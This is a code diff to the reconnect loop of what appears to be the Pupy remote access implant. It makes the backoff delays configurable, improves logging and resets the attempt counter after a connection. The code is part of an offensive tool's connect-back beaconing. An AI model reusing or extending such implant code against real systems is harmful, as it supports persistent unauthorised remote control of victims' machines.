@@ -461,6 +461,7 @@ def safe_obtain(proxy):
 
 debug = False
 CONFIGURATION_CID = 0x31337
+DELAYS = [(10, 5, 10), (50, 30, 50), (-1, 150, 300)]
 
 LAUNCHER = "connect"  # the default launcher to start when no argv
 # default launcher arguments
@@ -667,12 +668,14 @@ class BindSlaveService(ReverseSlaveService):
 
 
 def get_next_wait(attempt):
-    if attempt < 10:
-        return random.randint(5, 10)
-    elif attempt < 50:
-        return random.randint(30, 50)
-    else:
-        return random.randint(150, 300)
+    try:
+        for conf_attempt, delay_min, delay_max in DELAYS:
+            if conf_attempt == -1 or attempt < conf_attempt:
+                return random.randint(delay_min, delay_max)
+    except Exception, e:
+        logger.exception('get_next_wait %d, %s', attempt, e)
+
+    return random.randint(150, 300)
 
 def set_connect_back_host(HOST):
     import pupy
@@ -808,7 +811,9 @@ def main():
         finally:
             if not sys.terminated:
                 sleep_secs = get_next_wait(attempt)
-                logger.info("reconnect in %d seconds...", sleep_secs)
+                logger.info(
+                    'Attempt %d - reconnect in %d seconds...',
+                    attempt, sleep_secs)
                 time.sleep(sleep_secs)
                 attempt += 1
 
@@ -845,7 +850,7 @@ def rpyc_loop(launcher):
 
                 sys.terminate = s.close
                 pupy.connected = True
-
+                attempt = 0
                 s.start()
                 sys.terminate = None
                 pupy.connected = False
@@ -860,6 +865,9 @@ def rpyc_loop(launcher):
                 )
 
                 conn.init()
+
+                attempt = 0
+
                 conn.loop()
 
         except SystemExit:
